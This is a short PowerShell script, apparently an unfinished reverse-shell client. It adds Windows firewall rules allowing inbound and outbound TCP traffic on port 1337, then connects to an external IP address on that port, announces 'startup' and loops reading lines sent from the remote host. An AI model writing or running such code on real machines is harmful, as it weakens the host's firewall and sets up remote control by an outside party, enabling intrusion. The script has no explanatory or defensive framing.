if (!$(Get-NetFirewallRule -DisplayName "rs1in" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1in" -Direction Inbound -LocalPort 1337 -Protocol TCP -Action Allow
} else {
	Write-Output "Rule already exists";
}

if (!$(Get-NetFirewallRule -DisplayName "rs1out" 2>$null)) {
	New-NetFirewallRule -DisplayName "rs1out" -Direction Outbound -LocalPort 1337 -Protocol TCP -Action Allow
} else {
	Write-Output "Rule already exists";
}

try {
	$client = New-Object System.Net.Sockets.TCPClient("73.113.78.58", 1337);
	$stream = $client.GetStream();
	$writer = New-Object System.IO.StreamWriter($stream);
	$reader = New-Object System.IO.StreamReader($stream);
	$writer.Write("startup");
	$stream.Flush();
	$in_buff = [char[]]::new(1024)
	$out_msg = "";
	$exit = 0;
	while ($exit -eq 0) {
		Write-Output "HIT";
		while ($reader.Peek() -ge 0) {		
			$in_buff = $reader.ReadLine();
		}
		if($stream.Connected) {
			
		} else {
			$exit = 1;
		}
		Write-Output $in_buff;
	}
	
	#$in_buff = $reader.ReadLine();
	#Write-Output $in_buff;
	#$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
	
	#$i = $stream.Read($bytes, 0, $bytes.Length)

	
	
	$client.Close()

	
}
catch {
	Write-Output $_;
}

